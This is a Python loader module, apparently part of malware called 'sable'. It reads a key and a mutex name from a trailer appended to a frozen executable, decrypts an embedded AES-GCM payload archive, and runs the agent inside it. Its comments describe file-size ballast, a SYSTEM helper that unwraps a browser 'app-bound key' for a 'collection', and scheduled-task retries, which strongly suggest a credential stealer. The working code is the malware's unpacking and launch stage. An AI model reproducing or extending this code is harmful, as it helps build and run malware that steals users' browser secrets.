"""Archive loader: trailer, mutex, footer, decryption, mount.

This is the only module that decrypts, and the only one that runs before a config
exists. The two values it needs before anything else — the seal key and the mutex
name — come from the trailer, a fixed-width block welded between the sealed blob and
the footer. That is what makes a frozen launcher artifact-independent: the launcher
carries the reader, never the key, so one freeze opens every build.

Layout of the built artifact, last byte backwards:

    [ launcher ][ ballast ][ sealed blob ][ trailer 868 ][ footer 12 bytes ]

The footer is ``b"SBLT"`` followed by the little-endian offset of the sealed blob, so
it is found with one seek from EOF. The trailer is a fixed size, so its start is the
same arithmetic. The ballast sits before the sealed blob rather than after the
footer: with the footer last, the offset needs no length field, and a ballast
appended after the footer would make the footer unlocatable without a scan.

The decrypt half of the seal lives here rather than in ``core/seal.py`` because the
launcher cannot import a module that is inside the archive it has not decrypted yet.
``tests/test_contracts.py`` seals with ``core.seal`` and opens with this function, so
the two cannot drift apart silently.
"""

from __future__ import annotations

import importlib
import importlib.machinery
import importlib.util
import os
import shutil
import sys
import tempfile
import zipfile
from pathlib import Path
from types import ModuleType
from typing import Any, Final, NamedTuple

from . import log, util, winapi

# Pinned to core/forge.py by tests/test_contracts.py. Declared twice on purpose: this
# module ships inside the archive and cannot import the build side.
FOOTER_MAGIC: Final[bytes] = b"SBLT"
FOOTER_SIZE: Final[int] = 12

# The helper's flag, duplicated from ``agent/abe.py`` for a hard reason: the mutex is
# acquired before the payload is unpacked, and ``abe`` lives inside the payload. The
# helper re-execs this same image, so without this the guard rejects it as a second
# instance and the unwrap never runs — the app-bound key is silently unavailable for
# the whole collection. Pinned to ``abe.UNWRAP_FLAG`` by tests/test_contracts.py.
HELPER_FLAG: Final[str] = "--abe-unwrap"

TRAILER_MAGIC: Final[bytes] = b"SBLK"
KEY_SLOT: Final[int] = 64
MUTEX_SLOT: Final[int] = 200 * 4
TRAILER_SIZE: Final[int] = len(TRAILER_MAGIC) + KEY_SLOT + MUTEX_SLOT

SALT_SIZE: Final[int] = 16
NONCE_SIZE: Final[int] = 12
TAG_SIZE: Final[int] = 16
KDF_ITERATIONS: Final[int] = 200_000
MAX_SEALED_BYTES: Final[int] = 512 * 1024 * 1024

_STATE_ATTRIBUTE: Final[str] = "_sable_state"


class ArchiveError(RuntimeError):
    """The artifact is not shaped like an archive this loader can open."""


class Trailer(NamedTuple):
    """The two values read out of the block before the footer."""

    seal_key: str
    mutex: str


class Prepared(NamedTuple):
    archive: zipfile.ZipFile
    workspace: Path
    source: Path


def _state() -> dict[str, Any]:
    """Process-wide state shared across the launcher and payload copies of this module.

    ``sys`` is one object per process; the module globals are not, because the
    payload carries its own copy of every file. Both copies must agree that the
    mutex is held and that the archive has been prepared exactly once.
    """
    existing = getattr(sys, _STATE_ATTRIBUTE, None)
    if isinstance(existing, dict):
        return existing
    state: dict[str, Any] = {"held": False, "handle": None, "prepared": None}
    setattr(sys, _STATE_ATTRIBUTE, state)
    return state


def acquire(mutex: str | None = None) -> bool:
    """Take the mutex guard. False when another instance already holds it.

    ``mutex`` is given by the ``.py`` artifact, which has no trailer to read. The
    launcher passes nothing and the name comes out of the trailer. A second call in
    the same process is a no-op that reports the first call's answer.
    """
    state = _state()
    if state["held"]:
        return True

    name = mutex if mutex is not None else _read_trailer(util.executable_path()).mutex
    handle, created = winapi.create_mutex(name)
    if not created:
        log.logger.debug("loader: mutex %s is already held", name)
        return False

    state["held"] = True
    state["handle"] = handle
    return True


def prepare() -> Prepared:
    """Read the trailer and footer, decrypt to a temp file, replace it, open it."""
    state = _state()
    cached = state["prepared"]
    if cached is not None:
        return cached

    executable = util.executable_path()
    seal_key = _read_trailer(executable).seal_key
    offset = _archive_offset(executable)
    sealed = _read_sealed(executable, offset)
    plaintext = _open_sealed(sealed, seal_key)

    workspace = Path(tempfile.mkdtemp(prefix="sable-"))
    target = workspace / "payload.zip"
    staging = workspace / "payload.zip.part"
    staging.write_bytes(plaintext)
    # Never decrypt in place over the source, and never hand a half-written file to
    # zipfile: the replace is atomic within the same directory.
    os.replace(staging, target)

    archive = zipfile.ZipFile(target)
    prepared = Prepared(archive=archive, workspace=workspace, source=target)
    state["prepared"] = prepared
    log.logger.debug("loader: archive opened, %d bytes", len(plaintext))
    return prepared


def adopt(archive: zipfile.ZipFile, workspace: Path, source: Path) -> None:
    """Register an already-decrypted archive as the prepared one.

    The generated ``.py`` artifact decrypts its own payload and hands it here, so
    the rest of the boot path — config, gate, collection — runs exactly as it does
    behind a frozen launcher. ``prepare`` returns this instead of seeking a trailer
    that a text file does not have. Replacing a previous entry closes it first.
    """
    state = _state()
    previous = state["prepared"]
    if previous is not None:
        try:
            previous.archive.close()
        except OSError:
            log.logger.debug("loader: previous archive close failed", exc_info=True)
    state["prepared"] = Prepared(archive=archive, workspace=workspace, source=source)


def cleanup() -> None:
    """Close the archive and remove the workspace. Safe to call twice."""
    state = _state()
    prepared = state["prepared"]
    if prepared is None:
        return
    state["prepared"] = None
    try:
        prepared.archive.close()
    except OSError:
        log.logger.debug("loader: archive close failed", exc_info=True)
    shutil.rmtree(prepared.workspace, ignore_errors=True)


def _guarded(argv: list[str]) -> bool:
    """Whether this run may continue, i.e. nobody else is holding the mutex.

    The helper is exempt. It is a short-lived worker the running agent started, and the
    running agent is the one holding the mutex, so guarding the helper means it exits
    before its flag is ever read and the app-bound key is silently unavailable for the
    whole collection.
    """
    if HELPER_FLAG in argv:
        return True
    return acquire()


def boot() -> int:
    """Launcher entry: guard, prepare, load the payload entry, run it, clean up.

    Arguments are forwarded. The agent reads three of them and nothing else: the
    ``--retry`` that the delivery queue's scheduled task passes, the ``--abe-unwrap``
    the SYSTEM helper passes when it re-runs this same image, and ``--debug``. Dropping
    them here made both re-execs start a fresh collection instead of the job they were
    launched for.
    """
    if not _guarded(sys.argv):
        return 0

    try:
        prepared = prepare()
    except Exception:
        log.logger.exception("loader: archive preparation failed")
        return 1

    try:
        module = _load_entry(prepared.source)
        return int(module.main(sys.argv[1:]))
    except ArchiveError:
        log.logger.exception("loader: payload is not loadable")
        return 1
    except Exception:
        log.logger.exception("loader: payload raised")
        return 1
    finally:
        cleanup()


def _slot_text(field: bytes, name: str) -> str:
    """One NUL-terminated slot. Everything after the first NUL is padding."""
    text = field.split(b"\x00", 1)[0]
    if not text:
        raise ArchiveError(f"trailer {name} is empty")
    try:
        return text.decode("utf-8")
    except UnicodeDecodeError as exc:
        raise ArchiveError(f"trailer {name} is not UTF-8") from exc


def _read_trailer(executable: Path) -> Trailer:
    try:
        size = executable.stat().st_size
    except OSError as exc:
        raise ArchiveError(f"{executable.name}: cannot stat") from exc

    minimum = TRAILER_SIZE + FOOTER_SIZE + 1
    if size < minimum:
        raise ArchiveError(f"{executable.name}: {size} bytes cannot carry a trailer")

    with executable.open("rb") as handle:
        handle.seek(size - FOOTER_SIZE - TRAILER_SIZE)
        block = handle.read(TRAILER_SIZE)

    if len(block) != TRAILER_SIZE or block[: len(TRAILER_MAGIC)] != TRAILER_MAGIC:
        raise ArchiveError(f"{executable.name}: no {TRAILER_MAGIC!r} trailer")

    head = len(TRAILER_MAGIC)
    return Trailer(
        seal_key=_slot_text(block[head:head + KEY_SLOT], "seal key"),
        mutex=_slot_text(block[head + KEY_SLOT:], "mutex"),
    )


def _archive_offset(executable: Path) -> int:
    try:
        size = executable.stat().st_size
    except OSError as exc:
        raise ArchiveError(f"{executable.name}: cannot stat") from exc

    tail = FOOTER_SIZE + TRAILER_SIZE
    if size <= tail + 1:
        raise ArchiveError(f"{executable.name}: {size} bytes cannot carry a footer")

    with executable.open("rb") as handle:
        handle.seek(size - FOOTER_SIZE)
        footer = handle.read(FOOTER_SIZE)

    if len(footer) != FOOTER_SIZE or footer[:4] != FOOTER_MAGIC:
        raise ArchiveError(f"{executable.name}: no {FOOTER_MAGIC!r} footer")

    offset = int.from_bytes(footer[4:], "little")
    if offset <= 0 or offset >= size - tail:
        raise ArchiveError(f"{executable.name}: footer offset {offset} is outside the file")
    return offset


def _read_sealed(executable: Path, offset: int) -> bytes:
    end = executable.stat().st_size - FOOTER_SIZE - TRAILER_SIZE
    length = end - offset
    if length <= 0 or length > MAX_SEALED_BYTES:
        raise ArchiveError(f"sealed blob is {length} bytes")

    with executable.open("rb") as handle:
        handle.seek(offset)
        blob = handle.read(length)

    if len(blob) != length:
        raise ArchiveError(f"sealed blob is {len(blob)} of {length} bytes")
    return blob


def _open_sealed(blob: bytes, key_text: str) -> bytes:
    # Imported here so the module stays importable on a machine without pycryptodome,
    # which is what the Linux import test needs.
    from Crypto.Cipher import AES
    from Crypto.Hash import SHA256
    from Crypto.Protocol.KDF import PBKDF2

    minimum = SALT_SIZE + NONCE_SIZE + TAG_SIZE + 1
    if len(blob) < minimum:
        raise ArchiveError(f"sealed blob is {len(blob)} bytes, needs {minimum}")

    salt = blob[:SALT_SIZE]
    nonce = blob[SALT_SIZE:SALT_SIZE + NONCE_SIZE]
    tag = blob[-TAG_SIZE:]
    ciphertext = blob[SALT_SIZE + NONCE_SIZE:-TAG_SIZE]

    key = PBKDF2(
        key_text.encode("utf-8"),
        salt,
        dkLen=32,
        count=KDF_ITERATIONS,
        hmac_hash_module=SHA256,
    )
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    try:
        return cipher.decrypt_and_verify(ciphertext, tag)
    except ValueError as exc:
        raise ArchiveError("seal key rejected the archive") from exc


def _load_entry(archive_path: Path) -> ModuleType:
    """Exec ``agent.entry`` out of the archive, ahead of any copy on disk."""
    package_spec = importlib.machinery.PathFinder.find_spec("agent", [str(archive_path)])
    if package_spec is None or package_spec.loader is None:
        raise ArchiveError("archive carries no agent package")

    package = importlib.util.module_from_spec(package_spec)
    sys.modules["agent"] = package
    package_spec.loader.exec_module(package)

    for name in [key for key in sys.modules if key.startswith("agent.")]:
        del sys.modules[name]

    return importlib.import_module("agent.entry")


__all__ = [
    "FOOTER_MAGIC",
    "FOOTER_SIZE",
    "KEY_SLOT",
    "MUTEX_SLOT",
    "TRAILER_MAGIC",
    "TRAILER_SIZE",
    "ArchiveError",
    "Prepared",
    "Trailer",
    "acquire",
    "adopt",
    "boot",
    "cleanup",
    "prepare",
]
